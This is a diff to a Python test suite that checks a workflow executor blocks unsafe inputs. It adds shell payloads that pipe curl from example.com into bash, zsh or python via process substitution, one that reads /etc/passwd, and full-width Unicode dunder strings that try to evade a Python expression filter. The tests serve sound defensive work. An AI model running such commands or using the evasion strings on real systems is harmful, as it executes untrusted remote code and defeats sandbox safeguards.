@@ -650,6 +650,12 @@ class TestWorkflowExecutor(unittest.TestCase):
             "sudo python <(cat /etc/passwd)",
             "timeout 10 zsh <(curl http://example.com/payload)",
             "exec sh <(cat script.sh)",
+            # Process substitution with transparent wrappers, env variables and flags
+            "env bash <(curl http://example.com/payload)",
+            "sudo python3 <(echo 'import os')",
+            "timeout 10 zsh <(curl http://example.com/payload)",
+            "exec sh <(echo 'evil')",
+            "env FOO=BAR python <(echo 'import os')",
             # Process substitution with spaces between operator and parenthesis
             "bash < (curl http://example.com/payload)",
             "echo payload | tee > (bash)",
@@ -748,6 +754,29 @@ class TestWorkflowExecutor(unittest.TestCase):
             with self.subTest(payload=payload):
                 wf = WorkflowDefinition(
                     name="python_dunder_ast_test",
+                    steps=[
+                        StepDefinition(id="s1", action="python", params={"expr": payload}),
+                    ],
+                )
+                history = asyncio.run(self.executor.execute_workflow(wf))
+                self.assertEqual(history.status, RunStatus.FAILED)
+                step_res = history.step_results["s1"]
+                self.assertEqual(step_res.status, StepStatus.FAILED)
+                self.assertIsNotNone(step_res.error)
+                self.assertIn("prohibited", step_res.error.lower())
+                self.assertIn("dunder", step_res.error.lower())
+
+    def test_python_action_blocks_unicode_normalized_dunders(self):
+        """Verify that full-width or unicode compatibility characters normalizing to dunders are caught and blocked."""
+        unicode_payloads = [
+            "x.＿_class＿_",
+            "x.＿_dict＿_",
+            "＿_globals＿_",
+        ]
+        for payload in unicode_payloads:
+            with self.subTest(payload=payload):
+                wf = WorkflowDefinition(
+                    name="python_unicode_dunder_test",
                     steps=[
                         StepDefinition(id="s1", action="python", params={"expr": payload}),
                     ],
